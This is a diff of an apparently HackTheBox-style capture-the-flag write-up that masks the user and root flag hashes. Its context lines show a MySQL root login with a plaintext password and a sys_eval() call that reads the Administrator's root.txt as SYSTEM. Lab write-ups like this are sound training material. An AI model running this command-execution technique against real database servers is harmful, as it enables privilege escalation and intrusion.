@@ -171,7 +171,7 @@ type C:\Users\KioskUser\Desktop\user.txt
 ```
 
 ```
-d7ce0c96b6d9b5914129b3d412920044
+d7ce0c96b6d9b5914129b3d4129xxxxx
 ```
 
 (Note: this `cmd.exe` is plain Windows — no `cat`, `ls`, or other Unix tools. `type` reads a file's contents the way `cat` would.)
@@ -458,7 +458,7 @@ C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e "SELECT sys_eval('type C:
 
 ```
 sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt')
-8965d9f3956d85da06c39742a37dc767
+8965d9f3956d85da06c39742a37xxxxx
 ```
 
 ---
@@ -527,8 +527,8 @@ sys_eval() executes as nt authority\system → ROOT FLAG
 
 ## Flags
 
-- **User:** `d7ce0c96b6d9b5914129b3d412920044`
-- **Root:** `8965d9f3956d85da06c39742a37dc767`
+- **User:** `d7ce0c96b6d9b5914129b3d4129xxxxx`
+- **Root:** `8965d9f3956d85da06c39742a37xxxxx`
 
 ---
 
